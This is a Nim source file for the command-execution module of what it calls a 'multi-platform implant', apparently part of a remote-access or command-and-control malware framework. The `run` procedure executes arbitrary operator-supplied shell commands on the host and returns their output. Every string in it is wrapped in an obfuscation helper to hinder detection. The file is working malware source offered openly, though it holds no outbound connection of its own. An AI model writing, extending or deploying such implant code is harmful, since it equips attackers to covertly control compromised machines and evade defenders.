#[
    Cross-Platform run Command
    Command execution for multi-platform implant
    Compatible with Linux, macOS, and other Unix systems
]#

import osproc, strutils
import ../../util/strenc

# Cross-platform command execution
proc run*(args: seq[string]): string =
    try:
        when defined verbose:
            echo obf("DEBUG: Executing command with args: ") & $args
        
        if args.len == 0:
            return obf("ERROR: No command provided")
        
        let command = args.join(" ")
        
        when defined verbose:
            echo obf("DEBUG: Running: ") & command
        
        let (output, exitCode) = execCmdEx(command)
        
        when defined verbose:
            echo obf("DEBUG: Command completed with exit code: ") & $exitCode
        
        var runResult = ""
        
        if output.strip().len > 0:
            runResult = output.strip()
        else:
            runResult = obf("Command executed (no output)")
        
        # Add exit code information if not 0
        if exitCode != 0:
            runResult.add("\n" & obf("Exit code: ") & $exitCode)
        
        return runResult
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: run command failed: ") & e.msg
        return obf("ERROR: Command execution failed - ") & e.msg 